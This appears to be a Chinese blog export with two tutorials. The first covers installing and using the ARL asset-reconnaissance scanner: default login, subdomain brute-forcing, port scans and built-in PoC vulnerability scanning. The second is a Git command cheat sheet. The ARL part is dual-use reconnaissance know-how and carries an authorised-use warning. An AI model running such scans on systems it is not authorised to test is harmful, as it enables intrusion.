<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://127.0.0.1:5003</span><br></pre></td></tr></table></figure>

<h4 id="问题4：访问地址错误"><a href="#问题4：访问地址错误" class="headerlink" title="问题4：访问地址错误"></a>问题4：访问地址错误</h4><ul>
<li>现象：输入 <code>http://127.0.0.1:5003</code> 无法访问</li>
<li>解决：改用 <code>https</code> 开头的地址（因容器映射的是 HTTPS 端口）。</li>
</ul>
<h3 id="2-处理浏览器“不安全提示”"><a href="#2-处理浏览器“不安全提示”" class="headerlink" title="2. 处理浏览器“不安全提示”"></a>2. 处理浏览器“不安全提示”</h3><p>ARL 使用自签 SSL 证书，浏览器会提示“连接不安全”：</p>
<ul>
<li>操作：选择“高级”→“继续访问 127.0.0.1（不安全）”（仅本地访问，无风险）。</li>
</ul>
<h3 id="3-浏览器Cookie问题"><a href="#3-浏览器Cookie问题" class="headerlink" title="3. 浏览器Cookie问题"></a>3. 浏览器Cookie问题</h3><ul>
<li><strong>现象</strong>：重启ARL容器后，浏览器访问时出现”Network Error”，必须删除Cookie才能重新登录</li>
<li><strong>原因</strong>：容器重建后新会话与旧Cookie不匹配，且自签名证书变更导致浏览器Cookie绑定失效</li>
<li><strong>解决方案</strong>：<ul>
<li>强制刷新：按 <code>Ctrl+Shift+R</code>（跳过本地Cookie缓存）</li>
<li>使用隐私窗口：按 <code>Ctrl+Shift+P</code> 打开隐私窗口访问</li>
<li>自动清除Cookie：设置浏览器退出时自动删除Cookie（Firefox：<code>about:preferences#privacy</code> → Cookie和网站数据 → 退出Firefox时删除Cookie和网站数据）</li>
</ul>
</li>
</ul>
<blockquote>
<p>✅ <strong>推荐配置</strong>：<br>在Kali系统中，建议将Firefox设置为”退出时删除Cookie”，这样每次重启浏览器后都会自动清除旧Cookie，完全避免手动操作。操作路径：<br><code>菜单 → 设置 → 隐私与安全 → Cookie和网站数据 → 退出Firefox时删除Cookie和网站数据</code></p>
</blockquote>
<h3 id="4-默认登录-ARL"><a href="#4-默认登录-ARL" class="headerlink" title="4. 默认登录 ARL"></a>4. 默认登录 ARL</h3><p>使用默认账号密码：</p>
<ul>
<li>账号：<code>admin</code></li>
<li>密码：<code>arlpass</code></li>
</ul>
<h2 id="七、ARL-日常使用教程"><a href="#七、ARL-日常使用教程" class="headerlink" title="七、ARL 日常使用教程"></a>七、ARL 日常使用教程</h2><p>ARL 是资产侦察系统，核心用途是 <strong>发现目标资产、识别指纹、扫描漏洞</strong>，以下是新手必备的基础操作：</p>
<h3 id="1-核心功能界面介绍"><a href="#1-核心功能界面介绍" class="headerlink" title="1. 核心功能界面介绍"></a>1. 核心功能界面介绍</h3><p>登录后首页分为 5 个核心模块：</p>
<ul>
<li>「任务管理」：创建&#x2F;启动&#x2F;停止扫描任务；</li>
<li>「资产搜索」：查询已发现的资产（域名、IP、端口、服务等）；</li>
<li>「指纹管理」：查看已识别的应用指纹（如 Nginx、Tomcat、MySQL 等）；</li>
<li>「PoC 管理」：查看可利用的漏洞 PoC（无需手动上传，默认内置常用 PoC）；</li>
<li>「系统设置」：配置扫描线程、超时时间、邮件通知等。</li>
</ul>
<h3 id="2-创建第一个资产侦察任务"><a href="#2-创建第一个资产侦察任务" class="headerlink" title="2. 创建第一个资产侦察任务"></a>2. 创建第一个资产侦察任务</h3><h4 id="步骤1：进入「任务管理」→-点击「新建任务」"><a href="#步骤1：进入「任务管理」→-点击「新建任务」" class="headerlink" title="步骤1：进入「任务管理」→ 点击「新建任务」"></a>步骤1：进入「任务管理」→ 点击「新建任务」</h4><h4 id="步骤2：填写任务信息（重点配置）"><a href="#步骤2：填写任务信息（重点配置）" class="headerlink" title="步骤2：填写任务信息（重点配置）"></a>步骤2：填写任务信息（重点配置）</h4><table>
<thead>
<tr>
<th>配置项</th>
<th>填写说明</th>
</tr>
</thead>
<tbody><tr>
<td>任务名称</td>
<td>自定义（如“测试目标资产侦察”）</td>
</tr>
<tr>
<td>目标</td>
<td>输入要扫描的目标（支持多个，用换行&#x2F;逗号分隔）：<br>- 单个 IP：<code>192.168.1.100</code>；<br>- 网段：<code>192.168.1.0/24</code>；<br>- 域名：<code>example.com</code>；<br>- 子域名爆破：<code>*.example.com</code>（自动爆破子域名）</td>
</tr>
<tr>
<td>端口扫描</td>
<td>选择扫描类型：<br>- 常用端口：适合快速扫描；<br>- 全端口：扫描所有 65535 端口（耗时久）；<br>- 自定义端口：输入需要扫描的端口（如 <code>80,443,3389,22</code>）</td>
</tr>
<tr>
<td>扫描线程</td>
<td>新手建议默认（50 线程），线程越多扫描越快，但容易触发目标防护规则</td>
</tr>
<tr>
<td>其他选项</td>
<td>勾选“子域名爆破”“端口扫描”“指纹识别”“PoC 扫描”（按需选择）</td>
</tr>
</tbody></table>
<h4 id="步骤3：启动任务"><a href="#步骤3：启动任务" class="headerlink" title="步骤3：启动任务"></a>步骤3：启动任务</h4><p>点击「确认创建」→ 任务列表中找到刚创建的任务 → 点击「启动」。</p>
<h4 id="步骤4：查看扫描结果"><a href="#步骤4：查看扫描结果" class="headerlink" title="步骤4：查看扫描结果"></a>步骤4：查看扫描结果</h4><ul>
<li>任务状态变为「运行中」，等待扫描完成（时间取决于目标数量和端口范围，10 分钟~数小时不等）；</li>
<li>扫描完成后，点击任务名称 → 查看详细结果：<ul>
<li>「资产列表」：已发现的 IP、域名、端口、服务（如 <code>80/tcp http Nginx 1.21.0</code>）；</li>
<li>「指纹识别」：目标使用的应用程序、框架（如 Tomcat、WordPress、MySQL）；</li>
<li>「PoC 结果」：已识别的漏洞（如弱密码、未授权访问、CVE 漏洞）；</li>
<li>「导出报告」：支持导出 HTML&#x2F;PDF 格式报告（用于整理扫描结果）。</li>
</ul>
</li>
</ul>
<h3 id="3-常用操作：资产搜索与筛选"><a href="#3-常用操作：资产搜索与筛选" class="headerlink" title="3. 常用操作：资产搜索与筛选"></a>3. 常用操作：资产搜索与筛选</h3><h4 id="场景：快速查找特定资产"><a href="#场景：快速查找特定资产" class="headerlink" title="场景：快速查找特定资产"></a>场景：快速查找特定资产</h4><ol>
<li>进入「资产搜索」模块；</li>
<li>输入筛选条件：<ul>
<li>按端口筛选：<code>port:80</code>（查找所有 80 端口开放的资产）；</li>
<li>按服务筛选：<code>service:http</code>（查找所有 HTTP 服务）；</li>
<li>按指纹筛选：<code>fingerprint:Nginx</code>（查找所有 Nginx 服务器）；</li>
<li>按漏洞筛选：<code>vuln:弱密码</code>（查找存在弱密码漏洞的资产）；</li>
</ul>
</li>
<li>点击「搜索」即可查看匹配结果。</li>
</ol>
<h3 id="4-安全注意事项"><a href="#4-安全注意事项" class="headerlink" title="4. 安全注意事项"></a>4. 安全注意事项</h3><ul>
<li>仅扫描 <strong>自己拥有权限的目标</strong>（如本地测试环境、授权测试目标），禁止扫描未授权的公网资产或他人服务器（违法违规）；</li>
<li>扫描公网目标时，降低扫描线程（如 20 线程），避免触发目标的 DDoS 防护规则；</li>
<li>定期备份 ARL 数据（数据存储在 <code>arl_db</code> 数据卷中，可通过 Docker 备份数据卷）。</li>
</ul>
<h2 id="八、常见问题汇总"><a href="#八、常见问题汇总" class="headerlink" title="八、常见问题汇总"></a>八、常见问题汇总</h2><table>
<thead>
<tr>
<th>问题现象</th>
<th>解决方案</th>
</tr>
</thead>
<tbody><tr>
<td>Docker Compose 安装提示”overwrite”冲突</td>
<td>卸载独立包 <code>docker-compose</code> ，使用系统预装的插件版 <code>docker compose</code> （无横杠）</td>
</tr>
<tr>
<td>Docker 加速配置不生效</td>
<td>检查 <code>daemon.json</code> 格式（逗号是否正确），重启 Docker 后用 <code>docker info</code> 验证</td>
</tr>
<tr>
<td>镜像拉取反复中断</td>
<td>补充阿里云加速源，重启 Docker 后逐个拉取镜像</td>
</tr>
<tr>
<td>访问 <code>http://127.0.0.1:5003</code> 无法打开</td>
<td>改用 <code>https://127.0.0.1:5003</code> （容器映射的是 HTTPS 端口）</td>
</tr>
<tr>
<td>容器启动后状态为 <code>Exited</code></td>
<td>查看日志：<code>docker compose logs 容器名</code>（如 <code>docker compose logs web</code>），重新拉取对应镜像后启动</td>
</tr>
<tr>
<td>扫描任务无法启动</td>
<td>检查 RabbitMQ 容器是否正常运行（<code>arl_rabbitmq</code> 状态为 <code>Up</code>），重启 ARL 后重试</td>
</tr>
<tr>
<td>扫描结果为空</td>
<td>目标可能未开放端口，或扫描规则过严，尝试选择”全端口扫描”+”子域名爆破”后重新扫描</td>
</tr>
<tr>
<td><strong>每次重启ARL后需删除浏览器Cookie才能访问</strong></td>
<td><strong>原因</strong>：容器重建后新会话与旧Cookie不匹配，且自签名证书变更导致浏览器Cookie绑定失效<br><br><strong>解决方案</strong>：<br>- 强制刷新：按 <code>Ctrl+Shift+R</code>（忽略本地Cookie缓存）<br>- 隐私窗口：按 <code>Ctrl+Shift+P</code> 打开隐私窗口访问<br>- 自动清除：设置浏览器退出时删除Cookie（Firefox：<code>about:preferences#privacy</code> → Cookie和网站数据 → 退出Firefox时删除Cookie和网站数据）</td>
</tr>
</tbody></table>
<blockquote>
<p>💡 <strong>补充说明</strong>：<br>此问题本质是浏览器对HTTPS证书的Cookie绑定机制导致。当您使用 <code>docker compose down</code> 停止服务后，ARL容器会销毁所有会话数据并重新生成自签名证书。浏览器保留的旧Cookie与新证书不匹配，导致认证失败。上述三种解决方案中，<strong>设置浏览器退出时自动清除Cookie是最彻底的解决方式</strong>，无需每次手动操作。</p>
</blockquote>
<h2 id="九、后续优化"><a href="#九、后续优化" class="headerlink" title="九、后续优化"></a>九、后续优化</h2><ol>
<li><strong>修改默认密码</strong>：登录后进入「个人中心」→「密码修改」，输入旧密码 <code>arlpass</code> 和新密码；</li>
<li><strong>备份 ARL 数据</strong>：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 备份数据卷 arl_db 到本地目录（如 ~/arl_backup）</span></span><br><span class="line">docker run --<span class="built_in">rm</span> -v arl_db:/source -v ~/arl_backup:/dest alpine <span class="built_in">cp</span> -r /source/* /dest/</span><br></pre></td></tr></table></figure></li>
<li><strong>更新 ARL 镜像</strong>：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 拉取最新镜像</span></span><br><span class="line">docker compose pull</span><br><span class="line"><span class="comment"># 重启容器</span></span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>渗透</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>ARL</tag>
        <tag>资产收集</tag>
      </tags>
  </entry>
  <entry>
    <title>Git</title>
    <url>/2024/12/10/Git/</url>
    <content><![CDATA[<h2 id="一、基础命令"><a href="#一、基础命令" class="headerlink" title="一、基础命令"></a>一、基础命令</h2><table>
<thead>
<tr>
<th>命令</th>
<th>功能说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>git init</code></td>
<td>初始化一个新的 Git 仓库</td>
</tr>
<tr>
<td><code>git log</code></td>
<td>查看提交历史</td>
</tr>
<tr>
<td><code>git add [文件名]</code></td>
<td>将文件添加到暂存区（<code>git add .</code> 添加所有修改）</td>
</tr>
<tr>
<td><code>git commit -m &quot;提交信息&quot;</code></td>
<td>提交暂存区的更改到本地仓库</td>
</tr>
<tr>
<td><code>git status</code></td>
<td>查看当前仓库状态（修改、暂存、提交情况）</td>
</tr>
<tr>
<td><code>git branch</code></td>
<td>查看本地所有分支（<code>git branch -a</code> 查看本地+远程所有分支）</td>
</tr>
<tr>
<td><code>git branch [分支名]</code></td>
<td>创建本地新分支（基于当前分支）</td>
</tr>
<tr>
<td><code>git checkout [分支名]</code></td>
<td>切换到指定本地分支</td>
</tr>
<tr>
<td><code>git checkout -b [分支名]</code></td>
<td>创建并切换到新分支（等价于 <code>git branch + git checkout</code>）</td>
</tr>
<tr>
<td><code>git checkout -b [本地分支名] origin/[远程分支名]</code></td>
<td>基于远程分支创建并切换本地分支</td>
</tr>
<tr>
<td><code>git branch -d [分支名]</code></td>
<td>安全删除本地分支（已合并）</td>
</tr>
<tr>
<td><code>git branch -D [分支名]</code></td>
<td>强制删除本地分支（未合并）</td>
</tr>
</tbody></table>
<h2 id="二、远程仓库管理"><a href="#二、远程仓库管理" class="headerlink" title="二、远程仓库管理"></a>二、远程仓库管理</h2><h3 id="1-添加-管理远程仓库"><a href="#1-添加-管理远程仓库" class="headerlink" title="1. 添加&#x2F;管理远程仓库"></a>1. 添加&#x2F;管理远程仓库</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加远程仓库</span></span><br><span class="line">git remote add origin [仓库地址]</span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTPS 方式</span></span><br><span class="line">git remote add origin https://github.com/用户名/仓库.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH 方式</span></span><br><span class="line">git remote add origin git@github.com:用户名/仓库.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改远程仓库地址</span></span><br><span class="line">git remote set-url origin [新地址]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看已配置的远程仓库</span></span><br><span class="line">git remote -v</span><br></pre></td></tr></table></figure>

<h3 id="2-克隆仓库（含指定非主分支）"><a href="#2-克隆仓库（含指定非主分支）" class="headerlink" title="2. 克隆仓库（含指定非主分支）"></a>2. 克隆仓库（含指定非主分支）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 克隆默认分支（通常是main/master）</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/你的GitHub用户名/仓库名.git  <span class="comment"># HTTPS</span></span><br><span class="line">git <span class="built_in">clone</span> git@github.com:你的GitHub用户名/仓库名.git       <span class="comment"># SSH</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 克隆指定非主分支（方式1：先克隆仓库，再切换分支）</span></span><br><span class="line">git <span class="built_in">clone</span> git@github.com:用户名/仓库.git</span><br><span class="line"><span class="built_in">cd</span> 仓库名</span><br><span class="line">git checkout -b 目标分支名 origin/目标分支名  <span class="comment"># 基于远程非主分支创建本地分支</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 克隆指定非主分支（方式2：直接克隆指定分支）</span></span><br><span class="line">git <span class="built_in">clone</span> -b 目标分支名 --single-branch git@github.com:用户名/仓库.git</span><br><span class="line"><span class="comment"># -b：指定分支；--single-branch：仅克隆该分支（减少体积）</span></span><br></pre></td></tr></table></figure>

<h2 id="三、分支核心操作（非主分支专属）"><a href="#三、分支核心操作（非主分支专属）" class="headerlink" title="三、分支核心操作（非主分支专属）"></a>三、分支核心操作（非主分支专属）</h2><h3 id="1-非主分支的本地-远程同步"><a href="#1-非主分支的本地-远程同步" class="headerlink" title="1. 非主分支的本地-远程同步"></a>1. 非主分支的本地-远程同步</h3><h4 id="（1）非主分支的提交与推送"><a href="#（1）非主分支的提交与推送" class="headerlink" title="（1）非主分支的提交与推送"></a>（1）非主分支的提交与推送</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 切换到目标非主分支</span></span><br><span class="line">git checkout dev  <span class="comment"># 示例：dev为非主分支</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 添加修改到暂存区</span></span><br><span class="line">git add .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 提交到本地仓库</span></span><br><span class="line">git commit -m <span class="string">&quot;feat: 非主分支dev添加XX功能&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 推送到远程非主分支（首次推送需关联本地与远程分支）</span></span><br><span class="line">git push -u origin dev  <span class="comment"># -u：建立本地dev与远程dev的关联，后续可直接git push</span></span><br><span class="line"><span class="comment"># 非首次推送（已关联）</span></span><br><span class="line">git push origin dev</span><br></pre></td></tr></table></figure>

<h4 id="（2）非主分支的拉取同步"><a href="#（2）非主分支的拉取同步" class="headerlink" title="（2）非主分支的拉取同步"></a>（2）非主分支的拉取同步</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 方式1：直接拉取远程非主分支到本地对应分支</span></span><br><span class="line">git checkout dev  <span class="comment"># 先切换到本地dev分支</span></span><br><span class="line">git pull origin dev  <span class="comment"># 拉取远程dev分支并合并到本地dev</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方式2：先获取远程分支更新，再合并（更可控）</span></span><br><span class="line">git fetch origin  <span class="comment"># 获取所有远程分支最新更新</span></span><br><span class="line">git checkout dev</span><br><span class="line">git merge origin/dev  <span class="comment"># 合并远程dev到本地dev</span></span><br></pre></td></tr></table></figure>

<h3 id="2-分支切换常见问题与解决"><a href="#2-分支切换常见问题与解决" class="headerlink" title="2. 分支切换常见问题与解决"></a>2. 分支切换常见问题与解决</h3><h4 id="（1）切换分支提示“未提交的更改会被覆盖”"><a href="#（1）切换分支提示“未提交的更改会被覆盖”" class="headerlink" title="（1）切换分支提示“未提交的更改会被覆盖”"></a>（1）切换分支提示“未提交的更改会被覆盖”</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 场景：当前分支有未提交修改，切换分支时被阻止</span></span><br><span class="line"><span class="comment"># 解决方式1：暂存未提交修改</span></span><br><span class="line">git stash  <span class="comment"># 暂存修改</span></span><br><span class="line">git checkout dev  <span class="comment"># 切换分支</span></span><br><span class="line"><span class="comment"># 回到原分支后恢复暂存：git stash pop</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解决方式2：放弃未提交修改（谨慎！不可逆）</span></span><br><span class="line">git checkout -- .  <span class="comment"># 撤销所有工作区修改</span></span><br><span class="line">git checkout dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解决方式3：提交当前修改后再切换</span></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;temp: 暂存当前修改&quot;</span></span><br><span class="line">git checkout dev</span><br></pre></td></tr></table></figure>

<h4 id="（2）切换分支后代码未更新（detached-HEAD-状态）"><a href="#（2）切换分支后代码未更新（detached-HEAD-状态）" class="headerlink" title="（2）切换分支后代码未更新（detached HEAD 状态）"></a>（2）切换分支后代码未更新（detached HEAD 状态）</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 场景：误切到提交ID而非分支名，出现“detached HEAD”提示</span></span><br><span class="line"><span class="comment"># 解决：切换到正确的分支名</span></span><br><span class="line">git checkout dev  <span class="comment"># 切回dev分支即可恢复正常</span></span><br></pre></td></tr></table></figure>

<h4 id="（3）本地无对应远程非主分支"><a href="#（3）本地无对应远程非主分支" class="headerlink" title="（3）本地无对应远程非主分支"></a>（3）本地无对应远程非主分支</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 场景：远程新增了dev分支，本地看不到</span></span><br><span class="line"><span class="comment"># 解决：先拉取远程分支列表，再创建本地分支</span></span><br><span class="line">git fetch origin  <span class="comment"># 拉取远程所有分支信息</span></span><br><span class="line">git checkout -b dev origin/dev  <span class="comment"># 基于远程dev创建本地dev分支</span></span><br></pre></td></tr></table></figure>

<h2 id="四、多设备同步工作流（含非主分支）"><a href="#四、多设备同步工作流（含非主分支）" class="headerlink" title="四、多设备同步工作流（含非主分支）"></a>四、多设备同步工作流（含非主分支）</h2><h3 id="核心逻辑"><a href="#核心逻辑" class="headerlink" title="核心逻辑"></a>核心逻辑</h3><p>多台电脑共享远程仓库 → 非主分支修改后 <code>git push</code> 推送 → 其他设备 <code>git pull</code> 拉取非主分支最新内容</p>
<h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><h4 id="1-新设备拉取远程非主分支"><a href="#1-新设备拉取远程非主分支" class="headerlink" title="1. 新设备拉取远程非主分支"></a>1. 新设备拉取远程非主分支</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 克隆仓库（或已克隆则跳过）</span></span><br><span class="line">git <span class="built_in">clone</span> git@github.com:用户名/仓库.git</span><br><span class="line"><span class="built_in">cd</span> 仓库名</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拉取远程非主分支并创建本地分支</span></span><br><span class="line">git fetch origin</span><br><span class="line">git checkout -b dev origin/dev  <span class="comment"># 示例：同步dev分支</span></span><br></pre></td></tr></table></figure>

<h4 id="2-修改并推送非主分支代码"><a href="#2-修改并推送非主分支代码" class="headerlink" title="2. 修改并推送非主分支代码"></a>2. 修改并推送非主分支代码</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 切换到目标非主分支</span></span><br><span class="line">git checkout dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑代码后提交</span></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;fix: dev分支修复XX问题&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 推送到远程非主分支</span></span><br><span class="line">git push origin dev</span><br></pre></td></tr></table></figure>

<h4 id="3-同步远程非主分支最新代码"><a href="#3-同步远程非主分支最新代码" class="headerlink" title="3. 同步远程非主分支最新代码"></a>3. 同步远程非主分支最新代码</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 切换到本地非主分支</span></span><br><span class="line">git checkout dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拉取远程最新修改</span></span><br><span class="line">git pull origin dev</span><br></pre></td></tr></table></figure>

<h2 id="五、SSH-配置与问题解决"><a href="#五、SSH-配置与问题解决" class="headerlink" title="五、SSH 配置与问题解决"></a>五、SSH 配置与问题解决</h2><h3 id="核心步骤"><a href="#核心步骤" class="headerlink" title="核心步骤"></a>核心步骤</h3><p>确认密钥添加正确 → 配置 SSH 识别密钥 → 修复文件权限</p>
<h4 id="1-确认公钥添加到-GitHub"><a href="#1-确认公钥添加到-GitHub" class="headerlink" title="1. 确认公钥添加到 GitHub"></a>1. 确认公钥添加到 GitHub</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看公钥内容</span></span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa.pub    <span class="comment"># 默认密钥</span></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/自定义密钥名.pub  <span class="comment"># 自定义密钥</span></span><br></pre></td></tr></table></figure>
<ul>
<li>复制完整文本（从 <code>ssh-rsa</code> 开头到邮箱结尾）</li>
<li>GitHub → Settings → SSH and GPG keys → 添加新 Key</li>
</ul>
<h4 id="2-配置-SSH-识别密钥"><a href="#2-配置-SSH-识别密钥" class="headerlink" title="2. 配置 SSH 识别密钥"></a>2. 配置 SSH 识别密钥</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">notepad ~/.ssh/config</span><br></pre></td></tr></table></figure>
<p>粘贴配置（根据实际情况修改）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">  HostName github.com</span><br><span class="line">  User git</span><br><span class="line">  IdentityFile C:/Users/你的用户名/.ssh/密钥文件名</span><br></pre></td></tr></table></figure>
<blockquote>
<p>路径使用 <code>/</code> 或 <code>\\</code>，例如：<code>C:/Users/张三/.ssh/id_rsa</code></p>
</blockquote>
<h4 id="3-修复密钥文件权限"><a href="#3-修复密钥文件权限" class="headerlink" title="3. 修复密钥文件权限"></a>3. 修复密钥文件权限</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.ssh</span><br><span class="line"><span class="built_in">chmod</span> 600 密钥文件名      <span class="comment"># 私钥权限</span></span><br><span class="line"><span class="built_in">chmod</span> 644 密钥文件名.pub  <span class="comment"># 公钥权限</span></span><br></pre></td></tr></table></figure>

<h4 id="4-测试连接"><a href="#4-测试连接" class="headerlink" title="4. 测试连接"></a>4. 测试连接</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line"><span class="comment"># 成功显示：Hi 用户名! You&#x27;ve successfully authenticated...</span></span><br></pre></td></tr></table></figure>

<h2 id="六、提交历史管理"><a href="#六、提交历史管理" class="headerlink" title="六、提交历史管理"></a>六、提交历史管理</h2><h3 id="1-撤销错误提交"><a href="#1-撤销错误提交" class="headerlink" title="1. 撤销错误提交"></a>1. 撤销错误提交</h3><h4 id="方法一：直接回退历史（个人仓库适用）"><a href="#方法一：直接回退历史（个人仓库适用）" class="headerlink" title="方法一：直接回退历史（个人仓库适用）"></a>方法一：直接回退历史（个人仓库适用）</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 切换到目标分支（示例：dev分支）</span></span><br><span class="line">git checkout dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 回退到正确提交（92d433f 为正确提交ID）</span></span><br><span class="line">git reset --hard 92d433f</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 强制推送到远程非主分支</span></span><br><span class="line">git push origin dev --force</span><br></pre></td></tr></table></figure>

<h4 id="方法二：创建撤销提交（多人协作适用）"><a href="#方法二：创建撤销提交（多人协作适用）" class="headerlink" title="方法二：创建撤销提交（多人协作适用）"></a>方法二：创建撤销提交（多人协作适用）</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 切换到目标分支</span></span><br><span class="line">git checkout dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 生成撤销提交（0dec4f6 为错误提交ID）</span></span><br><span class="line">git revert 0dec4f6</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 推送撤销提交到远程非主分支</span></span><br><span class="line">git push origin dev</span><br></pre></td></tr></table></figure>

<h4 id="后续操作"><a href="#后续操作" class="headerlink" title="后续操作"></a>后续操作</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;正确的提交信息&quot;</span></span><br><span class="line">git push origin dev  <span class="comment"># 推送到非主分支</span></span><br></pre></td></tr></table></figure>

<h3 id="2-修复本地分支与远程分支偏离问题"><a href="#2-修复本地分支与远程分支偏离问题" class="headerlink" title="2. 修复本地分支与远程分支偏离问题"></a>2. 修复本地分支与远程分支偏离问题</h3><h4 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h4><p>本地分支历史与远程分支历史不一致（本地包含远程已移除的提交）</p>
<h4 id="解决步骤（非主分支）"><a href="#解决步骤（非主分支）" class="headerlink" title="解决步骤（非主分支）"></a>解决步骤（非主分支）</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 切换到目标非主分支</span></span><br><span class="line">git checkout dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 保存未提交的修改（如有）</span></span><br><span class="line">git stash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 强制同步本地分支与远程分支</span></span><br><span class="line">git reset --hard origin/dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 确认同步完成</span></span><br><span class="line">git pull origin dev</span><br></pre></td></tr></table></figure>

<h2 id="七、高级分支同步技巧"><a href="#七、高级分支同步技巧" class="headerlink" title="七、高级分支同步技巧"></a>七、高级分支同步技巧</h2><h3 id="1-同步特定远程非主分支"><a href="#1-同步特定远程非主分支" class="headerlink" title="1. 同步特定远程非主分支"></a>1. 同步特定远程非主分支</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先获取所有远程分支更新</span></span><br><span class="line">git fetch origin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方式1：创建本地分支跟踪远程非主分支</span></span><br><span class="line">git checkout -b dev origin/dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方式2：重置当前非主分支到远程分支</span></span><br><span class="line">git checkout dev</span><br><span class="line">git reset --hard origin/dev</span><br></pre></td></tr></table></figure>

<h3 id="2-同步多个特定非主分支"><a href="#2-同步多个特定非主分支" class="headerlink" title="2. 同步多个特定非主分支"></a>2. 同步多个特定非主分支</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 批量同步dev、feature/user、hotfix/order分支</span></span><br><span class="line">git fetch origin</span><br><span class="line">git checkout dev &amp;&amp; git reset --hard origin/dev</span><br><span class="line">git checkout feature/user &amp;&amp; git reset --hard origin/feature/user</span><br><span class="line">git checkout hotfix/order &amp;&amp; git reset --hard origin/hotfix/order</span><br></pre></td></tr></table></figure>

<h3 id="3-同步远程仓库的所有分支（含非主分支）"><a href="#3-同步远程仓库的所有分支（含非主分支）" class="headerlink" title="3. 同步远程仓库的所有分支（含非主分支）"></a>3. 同步远程仓库的所有分支（含非主分支）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取所有远程分支</span></span><br><span class="line">git fetch --all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为每个远程分支创建本地分支</span></span><br><span class="line">git branch -r | grep -v <span class="string">&#x27;\-&gt;&#x27;</span> | <span class="keyword">while</span> <span class="built_in">read</span> remote; <span class="keyword">do</span> git branch --track <span class="string">&quot;<span class="variable">$&#123;remote#origin/&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$remote</span>&quot;</span>; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或删除所有本地分支后重新创建（谨慎！）</span></span><br><span class="line">git branch | grep -v <span class="string">&quot;main&quot;</span> | xargs git branch -D  <span class="comment"># 保留main，删除其他本地分支</span></span><br><span class="line">git fetch --all</span><br><span class="line">git branch -r | grep -v <span class="string">&#x27;\-&gt;&#x27;</span> | <span class="keyword">while</span> <span class="built_in">read</span> remote; <span class="keyword">do</span> git branch --track <span class="string">&quot;<span class="variable">$&#123;remote#origin/&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$remote</span>&quot;</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

